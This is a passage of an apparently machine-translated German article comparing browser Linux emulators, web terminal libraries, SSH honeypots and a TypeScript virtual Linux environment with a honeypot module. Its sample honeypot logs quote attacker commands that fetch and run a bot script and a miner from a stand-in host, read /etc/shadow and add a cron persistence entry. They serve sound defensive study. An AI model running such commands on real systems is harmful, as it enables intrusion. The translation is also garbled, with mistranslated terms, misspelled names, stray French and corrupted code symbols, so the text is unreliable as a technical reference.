Das`.wasm`Das Ergebnis ist gewaltig - eine minimale Ubuntu macht mehrere hundert Mo - aber es ist völlig autonom.`.wasm`Er kann Ubuntu in seinem Browser schalten. Dieser Satz sollte keinen Sinn ergeben, aber wir sind hier.

**GitHub**:[container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Zusammenfassung der Emulatorfamilie

| | `v86` | JSLinux/Tinyemu | jor1k | CheerpX | Webcontainer | container2wasm |
|---|---|---|---|---|---|---|
| **Architektur** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (Eigentümer) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Echter Kern** | ✅ | ✅ | ✅ | ✅ | ✓ (Node.js) | ✅ |
| **64-bit** | ❌ | ✓ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Package npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ✓ (CLI-Werkzeug) |
| **Verwendung Node.js** | ✅ | ❌ | ❌ | ❌ | ✓ (Only-Browser) | via Wasmtime |
| **Browser-Nutzung** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instanz** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Zeitstart** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | teilweise | ✅ |
| **Status** | ^ sehr aktiv | ^ stabil | ✓ Archiviert | n Handel | ■ Aktiv | ■ Aktiv |

Was in diesem Bild leuchtet:`v86`ist der einzige, der ein npm-Paket ist, das sowohl im Browser als auch in Node läuft und Open-Source ist. Deshalb beherrscht er das Gespräch über "Linux-Emulatoren in JavaScript." Alles andere hat einen Nachteil – JSLinux hat keine API, jor1k ist archiviert, CheerpX kostet Geld, Webcontainers ist Node-only-Browsers und spezifisch, container2wasm erfordert einen Build-Schritt und eine CLI. Wenn du nur "Links in JaveScrip" starten musst,`v86`ist fast immer der richtige Ausgangspunkt.

---

## Teil 3 – Die Stacks terminal: xterm.js und node-pty

Zwei Pakete kommen ständig zurück, wenn Leute Shell-Erlebnisse bauen. Es sind keine Sandkästen oder Emulatoren – es sind die UI- und PTY-Versorgungs– aber sie sind so eng miteinander verbunden, dass ich mich schlecht fühlen würde, sie beiseite zu lassen. Auch habe ich sie beide benutzt und sie sind wirklich gut.

### 3.1`xterm.js`– das Terminal-Rendering

xterm.js ist ein Terminal-Emulator für den Browser. Es zeigt ein Terminal (Auspuffsequenzen VT100/xterm) in einem Element`<canvas>`, unterstützt Tastatureinträge und stellt eine API zur Übermittlung der Daten aus.

Wird verwendet von: das integrierte Terminal von VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell und viele andere.
```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Daten an das Terminal senden (als Text angezeigt)
term.write("$ ");
term.onData(data => {
  // Data sind die Schlagwörter – schickt deinen Backend
  socket.send(data);
});
socket.onmessage(msg => {
  // out of backend – Display
  term.write(msg.data);
});
```
xterm.js ist nur die Render-Schicht. Es führt keine Shell aus. Es interpretiert keine Befehle. Es ist ein Display-Widget, das du mit dem Backend deiner Wahl verbinden. Viele Leute denken, dass xtern.jS "das Terminal macht," aber es ist wirklich nur der Bildschirm – du musst es immer noch mit etwas verbinden, das wirklich Befehle ausführt.

**npm**:[@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) **GitHub**:[xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2`node-pty`– PTY-Erstellung

`node-pty`erstellt ein Pseudoterminal (PTY) in Node.js und gibt dir eine Lese-/Schreibhand. Mit xterm.jS kann ein Browser-Terminal aufgebaut werden, das mit einer echten Shell (bash, zsh, fish) spricht, die auf dem Server läuft.
```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // An den Browser sendenxterm.js via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Browser-Tasten an die Shell weiterleiten
  shell.write(data);
});
```
Dies ist das Standardschema für Cloud-IDEs und Web-Terminals: xterm.js (Browser) ↔ WebSocket ↔ node-pty ↔ wahre bash. Isolierung ist nicht vorhanden. Die Shell wird mit allen Berechtigungen des Node.jS-Prozesses (oder des Benutzers, der es ausspringt) ausgeführt.

**In den Besitz von**: Microsoft. **npm**:[node-pty](https://www.npmjs.com/package/node-pty) **GitHub**:[microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Teil 4 – Die SSH-Honeypots

Die Honeypots sind so konzipiert, dass sie angegriffen werden. Das Ziel ist es, so real zu sein, dass Angreifer mit ihnen interagieren, während sie alles aufnehmen, was sie für die Bedrohungsnachrichten tun. SSH ist das Hauptziel, weil es der am meisten angegriffene Dienst im Internet ist – wenn du Port 22 auf einer öffentlichen IP ausdrückst, wirst du Automatik-Scans in wenigen Minuten sehen. Versuch mal, es ist ziemlich entsetzlich, wie schnell das geschieht.

Die Qualität eines Honeypots wird an zwei Dingen gemessen: an der **Fähigkeit** (wie überzeugend es ein echtes System nachahmt) und an der **Telemetrie** (welche Menge nützlicher Daten es erfasst). Beide Dinge sind in Spannung. Ein HoneyPot Hoch-Fehl ist schwieriger zu bauen und riskanter zu operieren.

Dieser Abschnitt ist, was mich schließlich dazu geführt, dass das Modul`HoneyPot`in`typescript-virtual-container`Also habe ich hier ein paar Meinungen.

### 4.1 Cowrie – Goldstandard

Cowrie ist ein mittel- bis hochinteraktionsfähiger SSH- und Telnet-Honeypot auf Basis von Python. Es ist der am häufigsten in der Forschungs- und Sicherheitsgemeinschaft eingesetzte SSH Honeypots.

Architektur:

- **Protokoll-Farbe**: tatsächliche Implementierung des SSH-Protokolls (Twisted Conch), so dass Angreifer echte Handgriffe, ein echter Schlüsselaustausch, eine echte Authentifizierung haben

- **Shell-Schalter**: ein falsches Dateisystem (auf Debian 5.0) und ein teilweiser Shell-Desinterpreter, der auf aktuelle Befehle reagiert

- **Proxy-Mode**: kann zu einem echten System hinter (Hochinteraktionsmodus) umleiten, indem alles aufgezeichnet wird, was durchläuft

- **Mode LLM** (jüngstes Hinzufügen): verwendet ein Sprachmodell, um dynamische Antworten auf Befehle zu erzeugen, die er nicht verwalten kann – ja, Cowrie hat jetzt einen IA-Modus. Wir leben eine Zeit des Verrückten.
```python
# Was Cowrie fängt
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```
Cowire speichert heruntergeladene Dateien (via wget/curl/SFTP/SCP) für die Malwareanalyse. Es fügt sich in Splunk, Elasticsearch und andere SIEM-Plattformen ein.

** Treue**: Mittel-Hoch. Begreiflich genug, um automatisierte Bots zu täuschen (das macht 99% der SSH-Angreifer – die meisten sind nur dumme Skripte, die versuchen,`root` / `password`) Die ausgefeilten Menschen können ihn jedoch durch digitale Fingerabdrücke identifizieren, in der Regel ziemlich schnell.

**Sprache**: Python (Twisted) **GitHub**:[cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo - Cowis Vorgänger

Kippo ist der ursprüngliche mittlere SSH-Honeypot, auf dem Cowrie basierte. Gleiche grundlegende Idee: wahres SSH Protokoll, falsches Dateisystem, teilweise Shell. Cowry hat es an diesem Punkt vollständig ersetzt – Kippos ist archiviert und niemand sollte es im Jahr 2026 verwenden. Hier rein für historische Vollständigkeit erwähnt, da du es in alten Blog- und Sicherheitsdokumenten sehen konnten.

**GitHub**:[desaster/kippo](https://github.com/desaster/kippo)– abgelegt

---

### 4.3 endlessh – das SSH-Tarpit

endlessh ist ein degenerierter Honeypot: Er hält SSH-Verbindungen offen, indem er die Bannerdaten langsam auf 1 Byte pro Sekunde (oder weniger) ausbreitet. Ein SSH Client, der sich dort einloggt, wird auf unbestimmte Zeit blockiert bleiben - er wird nie zur Authentifizierung gelangen, weil der Server nie das Bannersenden beendet.

Das Ziel ist nicht die Geheimdienst-Bedrohung, sondern die reine Ressourcenverweigerung: die Scan-Threads der Angreifer zu besetzen, damit sie die wahren Ziele nicht so schnell erreichen können. Es ist ein wenig böse in der richtigen Richtung. Du lernst nichts vom Angreifern – du vergeudest ihm nur seine Zeit. Es gibt etwas zutiefst zufriedenstellend da drin.
```c
// Alles Protokollverhalten von Endlessh:
// Senden: "SSH-2.0-OpenSSH_" und dann langsam zufällige Zeichen hinzufügen
// Verbindung niemals schließen
// Der Scanner des Angreifers läuft nach N Sekunden aus
```
Keine Befehle werden erfasst. Keine Authentifizierung wird getestet. Nur Zeit für die Verbindung.

**Schrieben als**: C **GitHub**:[skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 shesame – der Honeypot "Lasst alle rein"

sshesame akzeptiert alle SSH-Verbindungen (jeder Benutzer, jedes Passwort, jeder Schlüssel) und speichert alles. Es ist ein Honeypot mit Null-Interaktion: es reagiert nicht auf Befehle, es lässt nur die Angreifer "eingeben" und protokolliert jeden Tastendruck, den sie eingeben.
```
2024-01-15 03:22:11 Connexion de 45.33.32.156
  Utilisateur : root, Mot de passe : password123 -- accepté
  Commandes tapées :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Déconnecté après 47s
```
Nützlich für die Identifikatorensammlung: Du sammlst schnell Benutzernamen und Passwörter, die Bots versuchen, was dir sagt, welche Standard-IDs derzeit aktiv rau sind. Spoiler: es ist immer noch`root` / `password` , `admin` / `admin`und`root` / `123456`Jedes Mal.

**GitHub**:[jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird – honeypot-basiertes Framework auf Docker

`lyrebird/honeypot-base`ist ein Grundbild für Docker, um Netzwerk-Honeypots zu bauen. Es ist nicht speziell ein SSH-Honypot - es ist ein Framework, um Honeypot für jedes Protokoll zu bauen, das du hast.

Das Grundbild bietet ein Protokollierungsframework, ein Plug-in-System für Protokolle und Docker Compose-Konfigurationen für Multi-Service-Honeypots. du erweitern es, um bestimmte Dienste zu simulieren.

**Docker Hub**:[lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Einen SSH-Honeypot in Node.js bauen – die naive Methode und warum es fehlschlägt

Vorne`typescript-virtual-container`, einen SSH Honeypot in Node.js zu bauen, bedeutete, die wahre Bibliothek zu kombinieren`ssh2`Mit einer manuellen Simulation von Steuerungen. Sehr langweilig, sehr unvollständig, aber... es ist ein notwendiger Übergang zu diesem Zeitpunkt:
```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Versuch protokollieren
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Alle reinlassen
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Simulation des Ansprechens
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```
Es funktioniert in dem Sinne, dass es die Identifikatoren und Befehle erfasst, aber es ist offensichtlich falsch, sobald ein anspruchsvoller Angreifer ein wenig graben.`uname -a`Gibt die richtige Zeichenkette zurück, aber`ls /etc`Gibt "command not found" zurück - es riecht nach einer Falle mit voller Nase. Das Dateisystem existiert nicht. Befehle werden nicht angekettet. Pfeifen funktionieren nicht. Variablen werden nicht ausgebreitet.

Ein kompetenter Angreifer wird deinen Honeypot in den ersten fünf Befehlen identifizieren. Automatisierte Skripte, die nach einem Verhalten des Typs Cowrie suchen, werden ihn auch sofort erkennen.`typescript-virtual-container`etwas zu bauen, das die Befehle wirklich für wahr interpretiert – mehr darüber in Teil 5.

---

### Zusammenfassung der Familie der Honeypots

| | Cowrie | Kippo | endlessh | Sshesam | Lyrebird | Naiv ssh2 |
|---|---|---|---|---|---|---|
| **Interaktions- fähigkeit** | mittel-hoch | mittel | Null | Null | Variable | niedrig |
| **Wahres SSH-Protokoll** | ✅ | ✅ | ✓ (Trapit) | ✅ | Variable | ✅ |
| **Shell-Trend** | Durchschnitt | Durchschnitt | n/a | Keine | Variable | Minimum |
| **Zeichnung der Kennungen** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Befehle kopieren** | ✅ | ✅ | ❌ | ✅ | Variable | ✅ |
| **Kaptiert Malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integration SIEM** | native | ❌ | ❌ | ❌ | ❌ | manuell |
| **LM-Antworten** | ✓ (neu) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Sprache** | Python | Python | C | Go | Docker | Node.js |
| **Node.js native** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ^ sehr aktiv | ✓ Archiviert | ■ Aktiv | ■ Aktiv | ■ Aktiv | DIY |

Das Schema hier ist ziemlich klar: Je mehr Treue du willst, desto mehr musst du Python schreiben. Cowrie ist der unangefochtene Gewinner, wenn du das ernst machst – es wurde jahrelang auf dem Feld getestet und mehr als nur Identifikatoren gefangen. endlessh und shesame sind mehr coole Projekte als ernsthafte Werkzeuge zur Bedrohungsnachricht. Und der naive Ansatz in Node.js führt dich vielleicht zu 20% des Weges, bevor du eine Wand schlägst.

---

## Teil 5 –`typescript-virtual-container`: die Kluft überbrücken

OK dann werden die Dinge interessant. Nachdem alle oben genannten Familien katalogisiert haben, wird der fehlende Quadrant ziemlich offensichtlich:

- JS Sandkästen: isolieren den Code, keine Shell, kein Dateisystem, kein SSH
- Linux-Emulatoren: echtes OS, echtes Shell, echte SSH... aber 150+ MB RAM, 30 Sekunden Start, und du musst deine eigene API über die seriellen E/S-Serie erstellen
- Honeypots: falsche Shell, keine programmierbare API, Python/Go/C, keine native Node

Niemand hatte eine komplette, programmierbare, native Node Linux-Umgebung mit echten SSH-Daten, echten Berechtigungen, einem echten virtuellen Netzwerk und einer Typischen Typic-Script-API gebaut.

Kleine Einführung, da ich sie zum ersten Mal richtig erwähnt habe:`typescript-virtual-container`wurde von [Chloé Rolzhausen](https://itsrealfortune.fr), eine französische Entwicklerin, die sich **Fortune** (oder ItsRealFortune) online nennt. du kann auf ihrem [site web](https://itsrealfortune.fr)und [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Das ganze Projekt - 56.000 Zeilen TypScript, 247 Dateien, 170 Befehle - war eine Einzelarbeit von einer Person. Ich nenne es Fortune für den Rest des Artikels. Und ja, das ist ziemlich verrückt.

### Was es wirklich ist

`typescript-virtual-container`ist ein **Simulations-Umgebungs-Simulator für Linux**, geschrieben als TypScript pur. Ohne Wasm, ohne native Erweiterungen, ohne Kernel. ~56.000 Quelllinien verteilt auf 247 TypSkript-Dateien.

Schlüssel-Know-how: du brauchst keine CPU-Emulator, um zu funktionieren`ls /etc | grep passwd`Du brauchst:

1. Eine Welle von Knoten im Speicher, die Pfad Operationen erfüllen

2. Ein POSIX-Lizenzmodell für jeden Zugriff

3. Ein shell-Syntax-Scanner, der Pipelines, Umleitungen, Untershells und die Erweiterung von Variablen umfasst

4. ~170 Befehlsimplementierungen (Funktionen, nicht Binär)

5. Ein System für die Verwaltung von Benutzern und Gruppen

6. Etwas, um das alles über SSH zu zeigen

Das alles ist in purem TypScript möglich, ohne dass der Kernel beteiligt ist.

### Das VirtualFileSystem

VFS ist ein typischer Knotenspeicher – kein Festplatten-E/S, es sei denn, du aktivieren ausdrücklich den Persistenzmodus`"fs"`:
```ts
// Vereinfachte interne Vertretung
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // platzholder faul beladen
```
Jeder Pfad-Operation geht durch`normalizePath`(Aussetzung)`.` , `..`, die symbolischen Verbindungen) und`enforceAccess`(prüft die Lese-/Schreib-/Ausführungsrechte im Vergleich zum Antragsteller).`chmod` , `chown`, die sticky bits und setuid werden alle implementiert und tatsächlich angewendet. Wenn ein Prozess, der als uid 1000 gedreht wird, versucht, eine Datei zu lesen, die dem root mit dem Modus 060, es erhält EACCS – kein gefälschtes EACKS, eine echte`Error`JavaScript gestartet seit der Erlaubnisprüfung. Dieser Teil ist ziemlich elegant.

Der VFS wird in folgenden Bereichen aufgebaut:

- `.vfsb`– ein kompaktes Binärformat (angepasst, mit Kompression pfelat) – das ist das Standardformat

- Instant JSON – menschlich lesbar, gut für Debugging

- Archive TAR – import/export mit dem echten tar-Format, also kannst du`tar -xf`Etwas und der VFS hat nur diese Dateien.

- Image SquashFS – Import en lecture seule

Im Dauerzustand`"fs"`, hält er ein Vorschreibprotokoll (WAL) für die Wiederherstellung nach dem Absturz – die Schriften gehen zuerst in das Protokoll, dann in den Augenblick während des Flush. Wenn Node in der Mitte einer Operation pflanzt, erlaubt das Protokoll dir, den letzten vollständigen Zustand wieder aufzubauen.

Es gibt auch eine Schicht`FileCache`die die Latenz von E/S-Disc simuliert. du konfigurieren Profile wie`NVME_DISK_IO`oder`HDD_DISK_IO`und der VFS verzögert künstlich die Operationen auf den Dateien, um realistische Zeitverzögerungen zu entsprechen. Das ist ziemlich lustig - eine Software, die absichtlich verlangsamt, um Hardware zu simulieren - aber tatsächlich sehr nützlich für Benchmarking.

### Der Shell-Interpreter

Der Syntax-Scanner der Shell produziert einen Typischen AST:
```ts
// "ls /etc ✓ grep root && echo done" wird analysiert in:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```
Der Executor führt diese AST durch:

- Für eine Pipeline erstellt es eine Stromkette`{ stdin, stdout, stderr }`und führt jeden Befehl mit E/S Pipelined aus

- Für logische Operatoren (`&&` , `||`), überprüft er`$?`nach links vor dem Ausführen des Rechts

- für Untershells (`$(...)` , ` ` ` ` `✓), es schaltet den Kontext der Ausführung

- für Umleitungen (`>fichier` , `>>fichier` , `2>&1` , `<fichier`), konfiguriert die Verkabelung der Ströme vor der Ausführung

- Für Hintergrundaufgaben (`cmd &`), wird es ohne das Ende

- Für Variablen, es erweitert`$VAR` , `${VAR:-default}` , `${#VAR}`, und Arithmetik`$((expr))`

- Für die Expansion von Akkoladen (`{a,b,c}` , `{1..5}`), erzeugt es die komplette Erweiterungsliste vor dem Ausführen

Das ist ein wahres POSIX-Shell-Verhalten. Der Analysator verwaltet Heredocs, Prozessersatz, Globbing (`*` , `?` , `[abc]`), und das Anführungszeichenmanagement (einfache Anführungsstriche, Doppelanführungsstücke mit Interpolation, Antislash-Auspuff). Das ist nicht perfekt – Grenzfälle existieren – aber das ist weit über das hinaus, was du von einem TypeScript-Projekt erwarten würdest.

### ~170 integrierte Befehle

Befehle sind TypeScript-Funktionen, die in einem Befehlsregister gespeichert sind.`CommandContext`mit den Streams stdin/stdout/stderr, VFS, Benutzer-Sitzung, Shell-Umgebung und Zugriff auf Submodule.

Schreibst du 170 Unix-Befehle implementieren, das ist... viel. Einige sind trivial (`echo` , `true` , `false`), sind einige überraschend komplex (`awk` , `find` , `tar`) Eine`awk`- Ist das eine Probe dessen, was darin ist:
```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (côté client, connexion sortante),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (éditeur interactif complet), vim (basique), vi (basique),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulé), systemctl (stub), journalctl (stub),
...et environ 130 autres
```
Die "Stubs" (Git, Python3, node) reagieren realistisch auf die häufigen Anrufe –`python3 –version`Gibt eine glaubwürdige Versionskette zurück,`git status`zeigt einen Zustand der fiktiven Ablagerung – ohne echte Arbeit zu tun. Für einen Honeypot sind sie eigentlich nützlicher als die realen Befehle, weil sie es Ihnen ermöglichen, zu beobachten, was Angreifer versuchen, ohne etwas gefährliches auszuführen.

### Der SSH-Server

SSH-Schicht verwendet das richtige npm-Paket`ssh2`– wahres SSH-Protokoll, echter Schlüsselaustausch, wahre Verschlüsselung.`SSHMimic`der Umschlag:
```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Wahre SSH: ssh -p2222 root@localhost
// Wahre SFTP: sftp -P2222 root@localhost
// Vrai SCP: Scp -P2222 Datei root@localhost:/tmp/
```
Die`shellProperties`• die`uname -a` , `lsb_release -a` , `neofetch` , `/proc/version`und`/etc/os-release`du kannst jede Linux-Distribution und Kernelversion überzeugend nachahmen – für einen echten SSH-Client gibt es buchstäblich keine Möglichkeit, den Unterschied zu machen.

### Das HoneyPot Modul

Da der Shell-Interpreter real ist und der SSH-Server real ist, laufen die Befehle der Angreifer tatsächlich in der virtuellen Umgebung.`wget`Die vom Angreifer ausgelösten Dateien werden mit den Ziel-URLs protokolliert. Die vom Stürmer erstellten Dateien werden im VFS gespeichert. Versuche, die Rechte des Angreifers zu klettern, verursachen realistische Fehler.
```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Nach einer Sitzung, Unterscheidung des Dateisystems
const before = shell.vfs.toSnapshot();
// ... Stürmersitzung ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```
Das ist qualitativ anders als Cowrie. Das falsche Dateisystem von Cowries kann auf`ls`aber kann nicht wirklich die Dateien verfolgen, die ein Angreifer erstellt hat, und die Änderungen, die er als strukturiertes Diff vorgenommen hat.`typescript-virtual-container`kann es, weil VFS eine lebendige Datenstruktur ist – jedem Schreiben wird gefolgt. Dieser cron-Eintrag, den der Angreifer gerade hinzugefügt hat? Er ist in der Diff.`.hidden`? In der Diff. Ziemlich nützlich für Malware-Analyse.

### Der virtuelle Netzwerkstapel

Dies ist wahrscheinlich der beeindruckendste Teil des gesamten Projekts und es hat kein Äquivalent in keinem anderen Projekt dieses Raumes. So wie ein kompletter virtueller L2/L3-Netzstapel mit VPN-Unterstützung, geschrieben in TypeScript rein, ohne irgendeine tatsächliche Netzwerkkarte beteiligt. Es ist wirklich verrückt.

`VirtualNetworkManager`gibt jeder Instanz`VirtualShell`virtuelle Netzwerkschnittstellen mit konfigurierbaren IP-Adressen, Routing-Tabellen und Software-Firewalls (Iptable Stilregeln mit connrack und NAT).`ip addr` , `ip route` , `iptables -L` , `netstat -rn`Alle zeigen den Status des virtuellen Netzwerks.

`VirtualSwitch`(Bay – des französischen Wortes für Server-Bay, "Computer-Bay") verbindet mehrere Shells in einem geteilten Subnetz. Es implementiert:

- Lernen MAC und ARP

- IP-Routing zwischen Subnetzen

- NAT (ausgehende Masquerade)

- DNS (konfigurierbare Unternetz-Aufnahmen)

- Ladungs-Gleichung (Round-Robin, weniger Verbindungen)

- Verkehrssteuerung: Latenz, Gigue (Gaussenverteilung), Paketverlust, Salvesverlust, Reordering, Duplizieren

- Bandbreitenbegrenzung (Token-Wasser)

- MTU-Anwendung

- Verbindungskontrolle (mit Zustand, NEW/ESTABLISHED/TIME_WAIT-Staaten)
```ts
const baie = new Baie("192.168.0.0/24");

// Drei virtuelle Maschinen auf demselben Schalter
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: Web kann erreichen api, apia kann db erreichen, web kann nicht erreichen db direkt
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Verkehrssteuerung: Simulation einer instabilen WAN-Verbindung nach außen
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```
`VirtualVpn`erstellt verschlüsselte Tunnel zwischen den Instanzen der Bucht – man kann ein Multi-Site-Netzwerk mit VPN-Verbindungen zwischen Standorten simulieren.

`VirtualProxy`implementiert das forwarding von den Häfen und ein Proxy SOCKS5.

Nichts davon berührt eine echte Netzwerkkarte. Das ist alles vom Routing von TypeScript-Objekten.`ping`"Eingang" durch das Rollen über den virtuellen Schalter und das Rückgeben simulierter ICMP-Antworten.`curl http://192.168.0.3/api`Route über virtuelles Netzwerk, erreicht die simulierte HTTP-Antwort des adi-Shell und gibt den Inhalt zurück. Es sind Schildkröten bis nach unten, in die bestmögliche Richtung.

### Das`SandboxedShell`

Für einen programmatischen Einsatz, wo du eine stärkere Isolierung brauchst,`SandboxedShell`führt eine Shell-Sitzung in einem thread Worker Node.js aus:
```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% d'un cœur
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```
Die Isolierung wird hier durch die VFS-Schicht (die Shell des Thread-Workers kann nur das virtuelle Dateisystem sehen, nie das Host-Dateisystem) plus die Speicherisolierung des Thread Worker Node.js. Es ist leichter als`isolated-vm`aber besser geeignet für eine Isolierung auf Shell-Ebene als auf JS-Ebene.

### Diversifizierung der Ressourcen

du kannst Ressourcengrenzen pro Shell einrichten, die beeinflussen, was Systemmonitoring-Befehle berichten:
```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```
Innerhalb dieser Shell,`free -m`Uhr 512 MB Gesamt-RAM.`nproc`Gib zwei zurück.`/proc/meminfo`zeigt die Grenzwerte an.`htop`und`top`zeigen die maximale Anzahl der CPUs. Damit kannst du den Materialabdruck der simulierten Maschine genau definieren.

### Drei Einsatzarten
```
Mode 1 : Serveur SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Vrai protocole SSH, vrai SFTP, vrai SCP
  → Cas d'usage : honeypots, environnements de test distants, laboratoires de formation

Mode 2 : Shell web (navigateur)
  builds/fortune-nyx-v1.7.8-web.min.js (bundle ESM)
  → Tourne dans le navigateur, VFS persisté dans IndexedDB
  → Cas d'usage : tutoriels interactifs, terminaux embarqués, démos
  → Bonus : exécute startxfce4 pour un bureau XFCE complet simulé

Mode 3 : CLI autonome
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (un seul fichier, pas d'installation)
  → curl et exécute, persisté le VFS dans le répertoire .vfs/
  → Cas d'usage : démos rapides, expérimentation locale
```
### Polyfills – wie der Browser-Build ohne Wasm funktioniert

Okay, das ist der Teil, den ich wirklich für klug halte und den ich besonders hervorheben wollte.

Eine Node.js-Bibliothek im Browser zu betreiben ist in der Regel ein Alptraum. Entweder du benutzt ein Runtime Wasm (schwer, langsam zu laden), oder du verbringst Wochen, um jeden Import manuell zu ersetzen`node:*`durch eine kompatible Browser-Alternative. Fortune hat das zweite getan - aber sehr sauber, indem sie eine Reihe von benutzerdefinierten Polyfills schrieb, die im Verzeichnis leben`polyfills/`- Ich hab's.

Die Build-Pipeline ist nur esbuild mit einer Menge von Eingängen`alias`:
```js
// Vorbemerkung/build.js– toute la config du build navigur
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
